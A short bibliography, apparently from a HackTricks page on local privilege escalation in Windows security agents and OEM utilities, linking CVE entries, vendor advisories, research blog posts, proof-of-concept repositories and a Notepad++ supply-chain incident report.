- [4] [UpSkope – Netskope IPCクライアント/エクスプロイト](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub、MSI Center、Acer Control Centre、Razer Synapse 4をPwning](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agentの書き込み可能ファイルを介したローカル権限昇格](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agentの権限昇格](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – 国家支援型攻撃者によるNotepad++サプライチェーンの悪用](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – インフラ乗っ取りインシデントの更新情報](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Netskope Client for WindowsにおけるCVE-2025-0309の修正回避](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantageの権限昇格バグの発見](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
